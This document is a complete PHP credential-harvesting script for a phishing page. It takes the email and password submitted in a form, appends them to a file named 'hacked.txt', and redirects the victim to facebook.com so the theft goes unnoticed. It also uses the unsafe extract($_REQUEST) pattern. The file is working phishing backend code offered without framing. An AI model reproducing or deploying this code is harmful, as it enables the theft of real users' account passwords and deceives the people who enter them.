
<?php 
    extract($_REQUEST);
    $file=fopen("hacked.txt","a");
// form data name ad or remove
    fwrite($file,"Email :");
    fwrite($file, $email ."\n");
    fwrite($file,"Password :");
    fwrite($file, $password ."\n");

    fwrite($file, "");
    fwrite($file, "\n");
    fclose($file);
    header("location:https://www.facebook.com");
?>